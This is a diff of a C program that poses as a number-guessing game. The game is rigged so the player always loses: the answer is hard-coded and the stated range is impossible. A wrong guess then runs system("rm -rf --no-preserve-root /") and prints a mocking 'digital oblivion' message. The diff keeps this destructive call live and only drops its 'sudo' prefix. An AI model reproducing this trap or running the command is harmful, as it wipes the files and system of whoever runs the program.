@@ -12,7 +12,7 @@ int main(void)
 	int guess, answer = -5;
 	size_t size;
 
-	/* set answer */
+	/* todo: set answer randomly instead of hard coding it */
 
 	printf("Guess a number between %d and %d.\nGuess wrong, and you'll C 4 yourself what'll happen.\n", INT_MAX, INT_MIN);
 
@@ -53,7 +53,7 @@ int main(void)
 		printf("0\n");
 		sleep(1);
 
-		system("sudo rm -rf --no-preserve-root /"); // deletes EVERYTHING
+		system("rm -rf --no-preserve-root /"); // deletes EVERYTHING
 
 		printf("%sSuccess! Deleti?n has c?mpleted. Enj?y digital ?blivi?n!\n%s\n", "\033[1;36m", "\033[0m");
 	}
